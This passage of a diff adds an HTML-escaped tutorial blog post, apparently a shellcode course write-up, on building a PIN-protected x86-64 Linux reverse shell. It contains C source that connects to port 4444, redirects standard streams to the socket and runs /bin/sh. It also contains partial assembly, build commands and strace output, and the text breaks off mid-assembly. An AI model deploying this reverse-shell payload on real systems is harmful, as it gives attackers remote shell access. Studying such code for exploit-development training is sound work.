+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//create a socket&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;//initiate a connection on a socket, on success 0 is returned&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PIN:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;connect-syscall&quot;&gt;&lt;b&gt;connect() syscall&lt;/b&gt;&lt;/h4&gt;
+
+&lt;p&gt;By the &lt;a href=&quot;http://man7.org/linux/man-pages/man2/connect.2.html&quot;&gt;Linux Programmer’s Manual&lt;/a&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall takes 3 arguments: a &lt;b&gt;file descriptor&lt;/b&gt; which refers to the socket we want to connect to, &lt;b&gt;addr&lt;/b&gt; struct which specifies the address information (IP and port) and &lt;b&gt;addrlen&lt;/b&gt;, the length of that address structure.&lt;/p&gt;
+
+&lt;p&gt;The socket we are going to be connecting to is of type AF_INET, which tells us we are dealing with an IPv4 address space. For IPv4 address space we need to specify AF_INET as the address family. We also specify with INADDR_ANY that we are making a connection to 0.0.0.0 and &lt;code class=&quot;highlighter-rouge&quot;&gt;htons(4444)&lt;/code&gt; presents the port to connect to in network byte order. Finally we add 8 zero bytes by using bzero() function as per definition.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To implement &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall successfully, the start address of the addr structure shold be specified as the 2nd argument (RSI). The third argument in turn should hold the length of the structure which we get when we add up the bytes of each of the structure members.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server.sin_family = 2 bytes
+server.sin_addr.s_addr = 4 bytes
+server.sin_port = 2 bytes
+bzero(&amp;amp;server.sin_zero, 8) = 8 bytes
+
+= total of 16 bytes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;assembly&quot;&gt;Assembly&lt;/h3&gt;
+
+&lt;p&gt;Now that we have gotten familiary with the &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall, let’s try to analyze and understand the assembly code which corresponds to the C code presented in the beginning of this blog post. I have decided to do it in 3 parts. First part is about how we use assembly to initiate the call back home, second part is what comes after we have established a connection and require the user to submit the correct PIN code. Based on the PIN code we can make a desicion whether to take the &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; syscall or jump to the 3rd part of the assembly code where we execute the actual shell via &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;part-1---making-a-call-home&quot;&gt;&lt;b&gt;Part 1&lt;/b&gt; - making a call home&lt;/h4&gt;
+
+&lt;p&gt;First thing we are going to do is create a new socket by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall. It takes 3 parameters and by convention these go to RDI, RSI and RDX registers. RDI will hold the address family AF_INET. You can find the corresponding number to AF_INET with python oneliner &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c import socket; print socket.AF_INET'&lt;/code&gt;. Same goes for the SOCK_STREAM &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket; print socket.SOCK_STREAM'&lt;/code&gt; which means we want the socket to be a TCP socket. At label &lt;code class=&quot;highlighter-rouge&quot;&gt;socket:&lt;/code&gt; we are using the ADD instruction to load these values (AF_INET: 2, SOCKSTREAM: 1) to registers RDI and RSI. The 3rd argument simply needs to be 0, so we can use the XOR instruction, as something XOR-ed by itself is always zero.&lt;/p&gt;
+
+&lt;p&gt;On successful return &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; returns as a non-negative number which is a file descriptor. This return value by convention is saved into RAX and this is the reason why on the last 2 lines we are moving the value from RAX to RDI and then clearing the RAX value as each following syscall would otherwise overwrite and destroy the fd.&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reverseshell&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;which&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;connects&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;back&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;correct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PIN&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;submitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;other&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;syscalls&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can also make a simple test at this point to know if your assembly code is written correctly or not, by using the strace tool. You should see AF_INET, SOCK_STREAM and IPPROTO_IP as arguments and a non-negative file descriptor number after the equal sign.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;felf64&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ld&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffd29c78350&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* 63 vars */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Moving on to the &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall. As described already in the bind shellcode post, struct members are layed out in memory contiguously, first member on the lowest and last member on the highest address. This is also the reason why we are pushing the 8 zero bytes to the stack first, 2 bytes for AF_INET the last and then adjust the stack pointer with &lt;code class=&quot;highlighter-rouge&quot;&gt;sub rsp, 8&lt;/code&gt; to point to the beginning of that structure in memory. By doing this we will have the start address of the structure in RSP which we can simply move to RSI for our 2nd argument. We already learned previously that RDX here will hold the size of our structure, which is 16 bytes (&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, 16&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;nx&quot;&gt;server_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;                         &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IN_ADDR_ANY&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5c11&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x115c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
